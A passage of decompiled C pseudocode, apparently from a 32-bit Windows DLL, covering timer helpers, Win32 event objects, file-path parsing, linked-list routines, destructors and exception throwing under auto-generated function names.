  char v6[47]; // [esp+Ch] [ebp-40h] BYREF
  char v7; // [esp+3Bh] [ebp-11h]
  int *v8; // [esp+3Ch] [ebp-10h]
  int v9; // [esp+48h] [ebp-4h]

  v8 = &v5;
  v7 = 0;
  while ( 1 )
  {
    result = 0;
    if ( v7 )
      return result;
    v9 = 0;
    v2 = (int *)sub_1001FA9F(*(_DWORD *)(a1 + 8), a1 + 12, (int)v6, 0);
    LOBYTE(v9) = 1;
    sub_1001FCC0(v2, a1 + 24);
    LOBYTE(v9) = 0;
    sub_1001FBA6((int)v6);
    v3 = sub_1001FCF0((void *)(a1 + 24));
    switch ( v3 )
    {
      case 0x1000u:
        v4 = *(_BYTE *)(a1 + 4) == 0;
        break;
      case 0x2000u:
        v4 = *(_BYTE *)(a1 + 5) == 0;
        break;
      case 0x10000u:
        v4 = *(_BYTE *)(a1 + 6) == 0;
        break;
      default:
        goto LABEL_11;
    }
    if ( !v4 )
      v7 = 1;
LABEL_11:
    *(_DWORD *)(a1 + 8) += *(_DWORD *)(a1 + 60);
    v9 = -1;
  }
}

//----- (1002295F) --------------------------------------------------------
DWORD *__userpurge sub_1002295F@<eax>(DWORD *a1@<esi>, DWORD a2)
{
  *a1 = GetTickCount();
  a1[1] = a2;
  return a1;
}

//----- (10022976) --------------------------------------------------------
int __usercall sub_10022976@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax
  DWORD v2; // ecx
  DWORD v3; // eax

  result = -1;
  if ( a1[1] != -1 )
  {
    v2 = GetTickCount() - *a1;
    v3 = a1[1];
    if ( v2 <= v3 )
      return v3 - v2;
    else
      return 0;
  }
  return result;
}

//----- (10022997) --------------------------------------------------------
bool __usercall sub_10022997@<al>(_DWORD *a1@<eax>)
{
  return a1[1] != -1 && sub_10022976(a1) == 0;
}

//----- (100229B0) --------------------------------------------------------
_DWORD *__stdcall sub_100229B0(_DWORD *a1, int a2)
{
  int v2; // eax
  const WCHAR *v3; // eax
  HANDLE EventW; // eax
  int v5; // eax
  _DWORD *v6; // eax
  _DWORD v8[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v9; // [esp+20h] [ebp-4h]

  v8[3] = 0;
  v2 = *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(v2 + 28) )
    v3 = *(const WCHAR **)(v2 + 12);
  else
    v3 = 0;
  EventW = CreateEventW(0, 0, 0, v3);
  sub_10012E21(a1, EventW, 0);
  v9 = 2;
  v5 = a1[1];
  *a1 = &off_10102F9C;
  *((_BYTE *)a1 + 8) = 0;
  if ( !*(_DWORD *)(v5 + 16) )
  {
    v6 = sub_1000E9DF(v8, 1, 1);
    LOBYTE(v9) = 4;
    sub_1000A947(v6, 23);
  }
  return a1;
}
// 10102F9C: using guessed type int (__thiscall *off_10102F9C)(void *Block, char);

//----- (10022A31) --------------------------------------------------------
int *__thiscall sub_10022A31(int *Block, char a2)
{
  sub_10022A50(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022A50) --------------------------------------------------------
void __thiscall sub_10022A50(int *this)
{
  *this = (int)&off_10102F9C;
  sub_10012E7E(this);
}
// 10102F9C: using guessed type int (__thiscall *off_10102F9C)(void *Block, char);

//----- (10022A79) --------------------------------------------------------
_DWORD *__cdecl sub_10022A79(_DWORD *a1, _DWORD *a2)
{
  wchar_t *v2; // eax
  _DWORD *v3; // eax
  int v5[2]; // [esp+4h] [ebp-18h] BYREF
  int v6; // [esp+Ch] [ebp-10h]
  int v7; // [esp+18h] [ebp-4h]

  v6 = 0;
  v2 = (wchar_t *)sub_1000CC40((int)&unk_10179188);
  v3 = sub_1000D17D(v5, v2);
  v7 = 1;
  sub_1000D5FF(a1, (int)v3, a2);
  v6 = 1;
  LOBYTE(v7) = 0;
  sub_1000D3AD(v5);
  return a1;
}

//----- (10022AD4) --------------------------------------------------------
BOOL __thiscall sub_10022AD4(_DWORD *this)
{
  BOOL result; // eax
  _DWORD *v2; // eax
  _DWORD v3[6]; // [esp+0h] [ebp-18h] BYREF

  result = SetEvent(*(HANDLE *)(this[1] + 16));
  if ( !result )
  {
    v2 = sub_1000E9DF(v3, 1, 1);
    v3[5] = 0;
    sub_1000A947(v2, 46);
  }
  return result;
}

//----- (10022B15) --------------------------------------------------------
BOOL __thiscall sub_10022B15(int this)
{
  _DWORD *v1; // eax
  BOOL result; // eax
  _DWORD *v3; // eax
  int v4[3]; // [esp+0h] [ebp-1Ch] BYREF
  int v5; // [esp+Ch] [ebp-10h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  if ( !*(_BYTE *)(this + 8) )
  {
    v1 = sub_1000E7F7(&v5, 1, 0);
    v6 = 0;
    sub_10007882((int)v1);
  }
  result = ResetEvent(*(HANDLE *)(*(_DWORD *)(this + 4) + 16));
  if ( !result )
  {
    v3 = sub_1000E9DF(v4, 1, 1);
    v6 = 1;
    sub_1000A947(v3, 50);
  }
  return result;
}
// 10022B15: using guessed type int var_1C[3];

//----- (10022B77) --------------------------------------------------------
int __stdcall sub_10022B77(int a1, int a2)
{
  DWORD FullPathNameW; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  _DWORD *v7; // eax
  _DWORD *v8; // eax
  int v9; // esi
  _DWORD *v10; // eax
  _DWORD *v11; // eax
  int v12; // ecx
  int v13; // ecx
  wint_t *v14; // eax
  _DWORD *v15; // eax
  int v16; // eax
  WCHAR Buffer[262]; // [esp+Ch] [ebp-22Ch] BYREF
  LPWSTR FilePart; // [esp+218h] [ebp-20h] BYREF
  int v20; // [esp+21Ch] [ebp-1Ch] BYREF
  int v21[3]; // [esp+220h] [ebp-18h] BYREF
  int v22; // [esp+234h] [ebp-4h]

  *(_DWORD *)a1 = off_10102FB4;
  sub_1000D17D((_DWORD *)(a1 + 4), &word_10179170);
  v22 = 5;
  sub_1000D17D((_DWORD *)(a1 + 12), &word_10179174);
  sub_1000D17D((_DWORD *)(a1 + 20), &word_10179178);
  sub_1000D17D((_DWORD *)(a1 + 28), &word_1017917C);
  sub_1000D17D((_DWORD *)(a1 + 36), &word_10179180);
  sub_1000D17D((_DWORD *)(a1 + 48), &word_10179184);
  FullPathNameW = GetFullPathNameW(*(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12), 0x104u, Buffer, &FilePart);
  if ( FullPathNameW > 0x104 )
  {
    v3 = sub_1000E7F7(&a2, 1, 0);
    LOBYTE(v22) = 6;
    sub_10007882((int)v3);
  }
  if ( !FullPathNameW )
  {
    v4 = sub_1000E9DF(&v20, 1, 1);
    LOBYTE(v22) = 7;
    sub_1000A947(v4, 20);
  }
  v5 = sub_1000D17D(v21, Buffer);
  LOBYTE(v22) = 8;
  sub_10001236(v5 + 1, (LONG *)(a1 + 8));
  LOBYTE(v22) = 5;
  sub_1000D3AD(v21);
  v6 = sub_1000DEE8(a1 + 4, 0x5Cu) + 1;
  v7 = sub_1000D836(-2, a1 + 4, v21, v6);
  LOBYTE(v22) = 9;
  sub_10001236(v7 + 1, (LONG *)(a1 + 32));
  LOBYTE(v22) = 5;
  sub_1000D3AD(v21);
  v8 = sub_1000D836(v6, a1 + 4, v21, 0);
  LOBYTE(v22) = 10;
  sub_10001236(v8 + 1, (LONG *)(a1 + 40));
  LOBYTE(v22) = 5;
  sub_1000D3AD(v21);
  v9 = sub_1000DEE8(a1 + 28, 0x2Eu);
  if ( v9 == -1 )
    v9 = *(_DWORD *)(*(_DWORD *)(a1 + 32) + 28);
  v10 = sub_1000D836(v9, a1 + 28, v21, 0);
  LOBYTE(v22) = 11;
  sub_10001236(v10 + 1, (LONG *)(a1 + 16));
  LOBYTE(v22) = 5;
  sub_1000D3AD(v21);
  v11 = sub_1000D836(-2, a1 + 28, v21, v9 + 1);
  LOBYTE(v22) = 12;
  sub_10001236(v11 + 1, (LONG *)(a1 + 24));
  LOBYTE(v22) = 5;
  sub_1000D3AD(v21);
  if ( *(_WORD *)sub_1000D52B(v12, 1u, (LONG *)(a1 + 4)) == 58 )
  {
    v14 = (wint_t *)sub_1000D52B(v13, 0, (LONG *)(a1 + 4));
    *(_WORD *)(a1 + 46) = towupper(*v14);
    *(_BYTE *)(a1 + 44) = 1;
  }
  else
  {
    v15 = sub_1000D836(-2, a1 + 4, v21, 2u);
    LOBYTE(v22) = 13;
    sub_10001236(v15 + 1, (LONG *)(a1 + 52));
    LOBYTE(v22) = 5;
    sub_1000D3AD(v21);
    v16 = sub_1000DE8B(0, a1 + 48, 0x5Cu);
    sub_1000DE34(v16, (LONG *)(a1 + 48));
    *(_BYTE *)(a1 + 44) = 0;
  }
  return a1;
}
// 10022D57: variable 'v12' is possibly undefined
// 10022D67: variable 'v13' is possibly undefined
// 10102FB4: using guessed type int (__thiscall *off_10102FB4[4])(void *Block, char);

//----- (10022DDA) --------------------------------------------------------
int *__thiscall sub_10022DDA(int *Block, char a2)
{
  sub_10022DF9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022DF9) --------------------------------------------------------
void __thiscall sub_10022DF9(int *this)
{
  *this = (int)off_10102FB4;
  sub_1000D3AD(this + 12);
  sub_1000D3AD(this + 9);
  sub_1000D3AD(this + 7);
  sub_1000D3AD(this + 5);
  sub_1000D3AD(this + 3);
  sub_1000D3AD(this + 1);
}
// 10102FB4: using guessed type int (__thiscall *off_10102FB4[4])(void *Block, char);

//----- (10022E68) --------------------------------------------------------
_DWORD *__stdcall sub_10022E68(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 28);
  return a2;
}

//----- (10022EA2) --------------------------------------------------------
_DWORD *__stdcall sub_10022EA2(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 12);
  return a2;
}

//----- (10022EDC) --------------------------------------------------------
_DWORD *__stdcall sub_10022EDC(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 20);
  return a2;
}

//----- (10022F16) --------------------------------------------------------
_DWORD *__stdcall sub_10022F16(int a1, _DWORD *a2)
{
  sub_1000D372(a2, a1 + 36);
  return a2;
}

//----- (10022F50) --------------------------------------------------------
int __thiscall sub_10022F50(void *this, int a2, int a3, char a4)
{
  _DWORD *v5; // eax
  int v7[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v8; // [esp+20h] [ebp-4h]

  *(_DWORD *)a2 = off_10104488;
  sub_10020765((int)this, (_DWORD *)(a2 + 4));
  v8 = 1;
  sub_1000D372((_DWORD *)(a2 + 12), a3);
  *(_BYTE *)(a2 + 20) = a4;
  sub_100215B9((int)this, (int)v7);
  LOBYTE(v8) = 2;
  if ( !sub_10021625((unsigned __int8 *)v7, a3) )
  {
    v5 = sub_100209F2(&a4);
    LOBYTE(v8) = 3;
    sub_1001A92A((int)v5);
  }
  LOBYTE(v8) = 1;
  sub_100215F9(v7);
  return a2;
}
// 10104488: using guessed type int (__thiscall *off_10104488[2])(void *Block, char);
// 10022F50: using guessed type int var_1C[4];

//----- (10022FE1) --------------------------------------------------------
int __thiscall sub_10022FE1(unsigned __int8 *this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v6[5]; // [esp+Ch] [ebp-2Ch] BYREF
  int (__thiscall **v7)(void *, char); // [esp+20h] [ebp-18h] BYREF
  int v8; // [esp+24h] [ebp-14h] BYREF
  char v9; // [esp+2Bh] [ebp-Dh] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_1001C041((int)&v9);
  v2 = sub_10020B19((int *)dword_1017E02C);
  (*(void (__thiscall **)(int, int *, unsigned __int8 *, unsigned __int8 *, int *, _DWORD))(*(_DWORD *)v2 + 36))(
    v2,
    v6,
    this + 4,
    this + 12,
    &v8,
    this[20]);
  v10 = 0;
  if ( v8 != 4 )
  {
    v3 = sub_100209F2(&v7);
    LOBYTE(v10) = 1;
    sub_10023241((int)v3);
  }
  v7 = off_10102FB8;
  LOBYTE(v10) = 2;
  v4 = sub_100231A5(v6);
  v7 = off_10102FB8;
  v10 = -1;
  sub_1000B3DF(v6);
  return v4;
}
// 10102FB8: using guessed type int (__thiscall *off_10102FB8[3])(void *Block, char);
// 1017E02C: using guessed type int dword_1017E02C;
// 10022FE1: using guessed type int var_14;
// 10022FE1: using guessed type int var_2C[5];

//----- (1002307A) --------------------------------------------------------
_DWORD *__thiscall sub_1002307A(unsigned __int8 *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+10h] [ebp-2Ch] BYREF
  int (__thiscall **v7)(void *, char); // [esp+24h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-14h]
  int v9; // [esp+2Ch] [ebp-10h] BYREF
  int v10; // [esp+38h] [ebp-4h]

  v8 = 0;
  sub_1001C041((int)&a2 + 3);
  v3 = sub_10020B19((int *)dword_1017E02C);
  (*(void (__thiscall **)(int, int *, unsigned __int8 *, unsigned __int8 *, int *, _DWORD))(*(_DWORD *)v3 + 36))(
    v3,
    v6,
    this + 4,
    this + 12,
    &v9,
    this[20]);
  v10 = 1;
  if ( v9 != 1 )
  {
    v4 = sub_100209F2(&v7);
    LOBYTE(v10) = 2;
    sub_10023241((int)v4);
  }
  v7 = off_10102FB8;
  LOBYTE(v10) = 3;
  sub_100231E4(v6, a2);
  v8 = 1;
  v7 = off_10102FB8;
  LOBYTE(v10) = 0;
  sub_1000B3DF(v6);
  return a2;
}
// 10102FB8: using guessed type int (__thiscall *off_10102FB8[3])(void *Block, char);
// 1017E02C: using guessed type int dword_1017E02C;
// 1002307A: using guessed type int var_2C[5];

//----- (10023120) --------------------------------------------------------
int __thiscall sub_10023120(unsigned __int8 *this)
{
  int v2; // eax
  int v4[5]; // [esp+8h] [ebp-28h] BYREF
  int v5; // [esp+1Ch] [ebp-14h] BYREF
  char v6; // [esp+23h] [ebp-Dh] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  sub_1001C041((int)&v6);
  v2 = sub_10020B19((int *)dword_1017E02C);
  (*(void (__thiscall **)(int, int *, unsigned __int8 *, unsigned __int8 *, int *, _DWORD))(*(_DWORD *)v2 + 36))(
    v2,
    v4,
    this + 4,
    this + 12,
    &v5,
    this[20]);
  v7 = -1;
  sub_1000B3DF(v4);
  return v5;
}
// 1017E02C: using guessed type int dword_1017E02C;
// 10023120: using guessed type int var_14;
// 10023120: using guessed type int var_28[5];

//----- (1002317E) --------------------------------------------------------
_DWORD *__thiscall sub_1002317E(_DWORD *Block, char a2)
{
  *Block = off_10102FB8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10102FB8: using guessed type int (__thiscall *off_10102FB8[3])(void *Block, char);

//----- (100231A5) --------------------------------------------------------
int __thiscall sub_100231A5(_DWORD *this)
{
  _DWORD *v1; // ecx
  _DWORD *v2; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  if ( !sub_1000B4B8(this) )
  {
    v2 = sub_100209F2(v4);
    v4[3] = 0;
    sub_10023241((int)v2);
  }
  return *(_DWORD *)sub_1000B4B8(v1);
}
// 100231D1: variable 'v1' is possibly undefined

//----- (100231E4) --------------------------------------------------------
_DWORD *__thiscall sub_100231E4(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD v5[5]; // [esp+8h] [ebp-14h] BYREF

  v5[1] = 0;
  if ( !sub_1000B4B8(this) )
  {
    v3 = sub_100209F2(v5);
    v5[4] = 1;
    sub_10023241((int)v3);
  }
  sub_1000D230(this, a2);
  return a2;
}

//----- (10023241) --------------------------------------------------------
void __cdecl __noreturn sub_10023241(int pExceptionObject)
{
  sub_1001E589(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
}

//----- (10023261) --------------------------------------------------------
_DWORD *__userpurge sub_10023261@<eax>(int a1@<edi>, _DWORD *a2)
{
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *Block; // [esp+Ch] [ebp-10h]

  sub_1001CA9C(a1, a2);
  *a2 = &off_10102E70;
  Block = operator new(0x40u);
  if ( Block )
  {
    v2 = sub_1001C78D(a2);
    v3 = sub_10023311(Block, v2);
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2 + 3, (int)v3);
  a2[5] = 128;
  return a2;
}
// 10102E70: using guessed type int (__thiscall *off_10102E70)(void *Block, char);

//----- (100232D7) --------------------------------------------------------
void __thiscall sub_100232D7(int this)
{
  *(_DWORD *)this = &off_10102E70;
  sub_1002228F((void **)(this + 12));
  sub_100128CB((int *)this);
}
// 10102E70: using guessed type int (__thiscall *off_10102E70)(void *Block, char);

//----- (10023311) --------------------------------------------------------
_DWORD *__stdcall sub_10023311(_DWORD *a1, int a2)
{
  a1[1] = a2;
  *a1 = off_10102FBC;
  a1[2] = 0;
  a1[3] = off_100FBF5C;
  a1[3] = &off_10102FC0;
  a1[4] = 0;
  a1[5] = 0;
  a1[6] = 0;
  sub_1001EC12((int)(a1 + 7));
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102FBC: using guessed type int (__thiscall *off_10102FBC[2])(void *Block, char);
// 10102FC0: using guessed type int (__thiscall *off_10102FC0)(void *Block, char);

//----- (10023377) --------------------------------------------------------
int *__thiscall sub_10023377(int *Block, char a2)
{
  sub_10023396(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10023396) --------------------------------------------------------
void *__thiscall sub_10023396(int *this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *this = (int)off_10102FBC;
  v4 = 2;
  while ( this[2] )
    sub_100234F6(this);
  v4 = 0;
  sub_1001ECA1(this + 7);
  v4 = -1;
  return sub_1002359E(this + 3);
}
// 10102FBC: using guessed type int (__thiscall *off_10102FBC[2])(void *Block, char);

//----- (10023406) --------------------------------------------------------
int __stdcall sub_10023406(int *a1)
{
  int v1; // eax
  int v3; // [esp+0h] [ebp-BCh] BYREF
  void *v4[22]; // [esp+Ch] [ebp-B0h] BYREF
  char v5; // [esp+64h] [ebp-58h]
  int v6[3]; // [esp+98h] [ebp-24h] BYREF
  _DWORD *v7[3]; // [esp+A4h] [ebp-18h] BYREF
  int v8; // [esp+B8h] [ebp-4h]

  v7[2] = &v3;
  sub_1000EDE4(a1 + 7, v7);
  v8 = 0;
  v1 = a1[2];
  if ( v1 )
  {
    a1[2] = v1 + 1;
  }
  else
  {
    a1[2] = 1;
    sub_100245E6((int)v4, a1[1]);
    LOBYTE(v8) = 2;
    while ( !v5 )
    {
      sub_100249F2(v4, v6);
      LOBYTE(v8) = 3;
      sub_10012974(v6);
      (*(void (__thiscall **)(int *, int *))(a1[3] + 36))(a1 + 3, v6);
      sub_1002481B((int)v4);
      LOBYTE(v8) = 2;
      sub_10012679(v6);
    }
    v8 = 0;
    sub_100247A9((int *)v4);
  }
  v8 = -1;
  return sub_1000EDA4(v7);
}
// 10023406: using guessed type int var_24[3];

//----- (100234F6) --------------------------------------------------------
int __usercall sub_100234F6@<eax>(_DWORD *a1@<esi>)
{
  unsigned int v1; // eax
  int v2; // eax
  void *v4[2]; // [esp+8h] [ebp-20h] BYREF
  _DWORD *v5[3]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  sub_1000EDE4(a1 + 7, v5);
  v6 = 0;
  v1 = a1[2];
  if ( v1 <= 1 )
  {
    a1[2] = v1 - 1;
    (*(void (__thiscall **)(_DWORD *, void **))(a1[3] + 12))(a1 + 3, v4);
    LOBYTE(v6) = 1;
    while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v4[0] + 4))(v4[0]) )
    {
      v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
      (*(void (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2);
      (*(void (__thiscall **)(void *))(*(_DWORD *)v4[0] + 24))(v4[0]);
    }
    LOBYTE(v6) = 0;
    sub_1002228F(v4);
  }
  else
  {
    a1[2] = v1 - 1;
  }
  v6 = -1;
  return sub_1000EDA4(v5);
}

//----- (1002359E) --------------------------------------------------------
void *__thiscall sub_1002359E(_DWORD *this)
{
  int *i; // eax
  int *v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10102FC0;
  v6 = 1;
  for ( i = (int *)this[1]; i; i = v3 )
  {
    v3 = (int *)i[3];
    sub_100237E9(i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10102FC0: using guessed type int (__thiscall *off_10102FC0)(void *Block, char);

//----- (10023604) --------------------------------------------------------
int __thiscall sub_10023604(_DWORD *this)
{
  return this[3];
}

//----- (10023608) --------------------------------------------------------
_DWORD *__thiscall sub_10023608(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10103000;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10103000: using guessed type int (__thiscall *off_10103000)(void *Block, char);

//----- (1002366E) --------------------------------------------------------
_DWORD *__thiscall sub_1002366E(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10103000;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10103000: using guessed type int (__thiscall *off_10103000)(void *Block, char);

//----- (100236D4) --------------------------------------------------------
int *__thiscall sub_100236D4(void *this, int *a2, unsigned int a3)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  int v6; // ecx
  unsigned int v7; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v4 )
  {
    v5 = sub_1000E8EF(&a3);
    sub_100078FE((int)v5);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( a3 )
  {
    v7 = a3;
    do
    {
      sub_10021F56(v6, *a2);
      --v7;
    }
    while ( v7 );
  }
  return a2;
}
// 1002372D: variable 'v6' is possibly undefined

//----- (10023748) --------------------------------------------------------
void __thiscall sub_10023748(void *this, int a2)
{
  void *v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(void *))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1002228F(v2);
}

//----- (10023786) --------------------------------------------------------
int __thiscall sub_10023786(void *this, int a2)
{
  int v2; // esi
  void *v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002228F(v4);
  return v2;
}

//----- (100237CA) --------------------------------------------------------
_DWORD *__thiscall sub_100237CA(_DWORD *Block, char a2)
{
  sub_1002359E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100237E9) --------------------------------------------------------
int *__stdcall sub_100237E9(int *Block)
{
  sub_10012679(Block);
  j__free(Block);
  return Block;
}

//----- (10023819) --------------------------------------------------------
int __thiscall sub_10023819(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10023858) --------------------------------------------------------
int __thiscall sub_10023858(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (10023897) --------------------------------------------------------
int *__thiscall sub_10023897(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int *result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 12);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 12) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 16) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_100237E9(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1002391F) --------------------------------------------------------
_DWORD *__thiscall sub_1002391F(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[3]; // [esp-14h] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-24h]
  int v8; // [esp-4h] [ebp-20h]
  int *v9; // [esp+8h] [ebp-14h]
  void *Block; // [esp+Ch] [ebp-10h]
  int v11; // [esp+18h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x14u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10012A1E(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100239D7(Block, v6[0], v6[1], v6[2], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (100239AE) --------------------------------------------------------
BOOL __thiscall sub_100239AE(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100239B7) --------------------------------------------------------
_DWORD *__thiscall sub_100239B7(_DWORD *Block, char a2)
{
  *Block = &off_10103000;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10103000: using guessed type int (__thiscall *off_10103000)(void *Block, char);

//----- (100239D7) --------------------------------------------------------
_DWORD *__stdcall sub_100239D7(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)
{
  sub_10012A1E((int)&a2, a1);
  a1[3] = a5;
  a1[4] = a6;
  sub_10012679(&a2);
  return a1;
}

//----- (10023A20) --------------------------------------------------------
void __stdcall sub_10023A20(int *a1)
{
  *a1 = (int)&off_10103020;
  sub_1000D3AD(a1 + 7);
  sub_1000D3AD(a1 + 4);
  sub_1000D3AD(a1 + 2);
}
// 10103020: using guessed type int (__thiscall *off_10103020)(void *Block, char);

//----- (10023A6A) --------------------------------------------------------
int *__thiscall sub_10023A6A(int *Block, char a2)
{
  sub_10023A20(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10023A8A) --------------------------------------------------------
char sub_10023A8A()
{
  unsigned int v0; // esi
  char v2; // bl
  DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5[3]; // [esp+Ch] [ebp-94h] BYREF
  int v6; // [esp+18h] [ebp-88h] BYREF
  unsigned int v7; // [esp+1Ch] [ebp-84h]
  _DWORD v8[6]; // [esp+28h] [ebp-78h] BYREF
  int v9[10]; // [esp+40h] [ebp-60h] BYREF
  int v10[11]; // [esp+68h] [ebp-38h] BYREF
  int v11; // [esp+9Ch] [ebp-4h]

  sub_10007972(&v6);
  v0 = 0;
  v11 = 0;
  if ( sub_10023C42((int)&v6) )
  {
    sub_1000D17D(v5, &word_10178FC4);
    LOBYTE(v11) = 1;
    sub_10024E99((int)v10, (int)&unk_10186A30, (int)v5);
    LOBYTE(v11) = 3;
    sub_1000D3AD(v5);
    sub_1000D17D(v5, &word_10178FC8);
    LOBYTE(v11) = 4;
    sub_10024E99((int)v9, (int)&unk_10186A28, (int)v5);
    LOBYTE(v11) = 6;
    sub_1000D3AD(v5);
    if ( (unsigned __int8)sub_10025092(v10) || (unsigned __int8)sub_10025092(v9) )
    {
      sub_100222EA();
      if ( v7 )
      {
        do
        {
          v3 = (DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v6 + 44))(&v6, v0);
          v4 = sub_1001CA35(*v3, v5, 0x400u);
          LOBYTE(v11) = 7;
          sub_10023261((int)v4, v8);
          LOBYTE(v11) = 9;
